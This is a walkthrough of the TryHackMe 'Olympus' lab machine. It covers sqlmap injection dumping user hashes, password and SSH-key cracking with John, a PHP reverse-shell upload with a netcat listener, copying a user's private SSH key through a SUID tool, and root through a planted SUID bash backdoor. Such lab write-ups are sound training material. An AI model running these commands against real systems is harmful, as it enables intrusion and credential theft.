# 🏛️ TryHackMe: Olympus Write-Up

A complete walkthrough of the Olympus room, showing how I gained initial access and escalated privileges to root.

---

# 📌 Room Information

| Room | Olympus |
|--------|--------|
| Platform | TryHackMe |
| Difficulty | Medium |

---

# 🔍 Step 1: Scanning the Target

The first thing I did was scan the machine to see which services were running.

```bash
nmap -T4 -A -p- <TARGET_IP>
```

### What this command does

- `-p-` scans all ports.
- `-A` detects services and versions.
- `-T4` speeds up the scan.

### Why I did this

Before attacking a machine, it is important to know what is exposed to the network.

### Result

```text
22/tcp  SSH
80/tcp  HTTP
```

I found:

- Port 22 running SSH
- Port 80 running a web server

Since web applications often contain vulnerabilities, I decided to investigate the website first.

---

# 🌐 Step 2: Adding the Domain to Hosts File

When I opened the website, it redirected to a domain name called:

```text
olympus.thm
```

To access the site correctly, I added it to my hosts file.

```bash
sudo nano /etc/hosts
```

Added:

```text
<TARGET_IP> olympus.thm
```


---

# 📂 Step 3: Finding Hidden Directories

Next, I looked for hidden files and directories on the website.

```bash
gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt
```

### What this command does

Gobuster checks many common directory names and files.

### Why I did this

Developers sometimes leave admin panels, backups, or old applications hidden on the server.

### Result

I discovered an old installation of **Victor CMS** (~webmaster).

This became my main target.

---

# 💉 Step 4: Discovering SQL Injection

While exploring the website, I found a search page:

```text
http://olympus.thm/~webmaster/search.php
```

The search parameter appeared vulnerable to SQL Injection.

### What is SQL Injection?

SQL Injection happens when user input is not properly filtered before being sent to a database.

An attacker can use it to read information directly from the database.

### Why this is useful

If successful, it may reveal:

- Usernames
- Password hashes
- Sensitive information

---

# 🤖 Step 5: Dumping Database Information

I used SQLMap to test and exploit the vulnerability.

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --random-agent --batch -D olympus -T users --dump
```

### What this command does

SQLMap automatically detects and exploits SQL Injection vulnerabilities.

### Why I did this

I wanted to see whether user credentials were stored in the database.

### Result

I found the following user hash:

```text
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

---

# 🔓 Step 6: Cracking the Password Hash

The hash was a bcrypt hash.

I saved it to a file and used John the Ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### What this command does

John compares the hash against passwords from a wordlist until a match is found.

### Why I did this

Hashes cannot normally be read directly.

Cracking them may reveal the original password.

### Result

```text
summertime
```

The password for Prometheus was recovered.

---

# 🌐 Step 7: Discovering a Hidden Subdomain

While reviewing the database entries, I noticed email addresses using:

```text
@chat.olympus.thm
```

This suggested another website existed.

I updated the hosts file again:

```text
<TARGET_IP> olympus.thm chat.olympus.thm
```

### Why I did this

Subdomains often contain separate applications with additional attack surfaces.

---

# 🚀 Step 8: Logging Into the Chat Application

Using the credentials I recovered:

```text
Username: prometheus
Password: summertime
```

I successfully logged into:

```text
http://chat.olympus.thm
```

---

# 📤 Step 9: Uploading a Reverse Shell

Inside the chat application, users were allowed to upload files.

I uploaded a PHP reverse shell.

### What is a Reverse Shell?

A reverse shell makes the target machine connect back to my attack machine, giving me command-line access.

---

# 🎧 Step 10: Starting a Listener

Before executing the shell, I started a listener on my Kali machine.

```bash
nc -nvlp 4444
```

### Why I did this

The reverse shell needs somewhere to connect back to.

Netcat waits for incoming connections.

---

# 🔍 Step 11: Finding the Uploaded File

The application renamed uploaded files.

To find the new filename, I dumped the chat database.

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --random-agent --batch -D olympus -T chats --dump
```

### Result

I found my uploaded file:

```text
9524e7f47b3db0375405303951b5f14b.php
```

---

# 🐚 Step 12: Getting Initial Access

I browsed to the uploaded file.

```text
http://chat.olympus.thm/uploads/9524e7f47b3db0375405303951b5f14b.php
```

The reverse shell connected back to my Netcat listener.

### Result

I gained access as:

```text
www-data
```

---

# 🔧 Step 13: Stabilizing the Shell

The shell was limited, so I upgraded it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Why I did this

A proper TTY shell makes it easier to run commands and navigate the system.

---

# 🔎 Step 14: Looking for Privilege Escalation

I searched for SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

### What is SUID?

SUID allows a program to run with the permissions of its owner.

Sometimes misconfigured SUID programs can be abused to gain higher privileges.

### Result

I found:

```text
/usr/bin/cputils
```
This binary was uniquely owned by the target system user **`zeus`**.
---

# 🦅 Step 15: Accessing Zeus's SSH Key
The custom `cputils` program functioned as an elevated file-copying asset. Because it executed with Zeus's privileges, 
I used it to copy Zeus's highly protected private SSH key directly into a readable public location:

Run the program:

```bash
/usr/bin/cputils

```

* **Enter the Name of Source File:** `/home/zeus/.ssh/id_rsa`
* **Enter the Name of Target File:** `/home/zeus/id`

The binary bypassed standard access restrictions. I printed the file (`cat /home/zeus/id`) and copied 
the complete open SSH private key block back to my attacking machine as `id_rsa`.

The `cputils` binary could copy files using Zeus's permissions.

I used it to copy:

```text
/home/zeus/.ssh/id_rsa
```

### Why I did this

SSH private keys can provide direct access to another user account.

---

# 🔐 Step 16: Cracking the SSH Key

The key was protected by a passphrase.

```bash
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

The passphrase was recovered.(snowf___e)

---

# 💻 Step 17: Logging In as Zeus

```bash
ssh -i id_rsa zeus@olympus.thm
```

### Result

I gained a stable shell as:

```text
zeus
```

I was also able to read the user flag.

---

# 👑 Step 18: Privilege Escalation to Root

While enumerating the system, I discovered a hidden backdoor binary:
While performing standard post-exploitation enumeration inside the web application root folders (`/var/www/html/`), 
I discovered an obscure, randomly named directory (`0aB44fdS3eDnLkpsz3deGv8TttR4sc`) containing a hidden 
maintenance script: `VIGQFQFMYOST.php`.

Inspecting its raw source code revealed that the challenge creator had deliberately compiled an administrative system backdoor
backdoor directly inside the operating system library paths:
```php
$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

```

```text
/lib/defended/libc.so.99
```


The underlying binary `/lib/defended/libc.so.99` was an exact copy of the Bash execution package compiled with permanent root 
ownership and SUID settings enabled.

Since I already held a stable, interactive SSH prompt as Zeus, I skipped invoking the web vector entirely and triggered that
hidden binary file directly. To force the kernel to respect and preserve my elevated root ownership settings, I appended
the **`-p`** flag:





Running it with:

```bash
/lib/defended/libc.so.99 -p
```

The terminal instantly dropped all privilege checks and shifted to an absolute administrative `#` prompt.
spawned a root shell.

### Why it worked

The binary had SUID permissions and preserved elevated privileges.

### Verification

```bash
whoami
```

Output:

```text
root
```
I navigated to the admin's home environment and captured the primary victory flag asset (`cat /root/root.txt`).

---

# 🎁 Step 19: Finding the Bonus Flag

I searched for hidden flag files.

```bash
grep -rnw '/etc/' -e "flag{" 2>/dev/null
```

### Key Flags

* `-r`: Recursive search across all subfolders.
* `-n`: Displays the exact matching text line number.
* `-w`: Enforces exact, complete word pattern matching.

### Result

```text
/etc/ssl/private/.b0nus.fl4g
```

```bash
cat /etc/ssl/private/.b0nus.fl4g

```

Reading the file revealed the bonus flag.

---



# 📚 Skills Practiced

- Nmap Enumeration
- Directory Brute Forcing
- SQL Injection
- Database Dumping
- Password Cracking
- Subdomain Enumeration
- File Upload Exploitation
- Reverse Shells
- Linux Privilege Escalation
- SUID Exploitation
- SSH Key Abuse

---

## 🎯 Conclusion

Olympus was a great room that demonstrated a full attack chain from web exploitation to root access. 
It provided hands-on experience with SQL Injection, credential attacks, file upload abuse, privilege escalation, 
and Linux post-exploitation techniques.
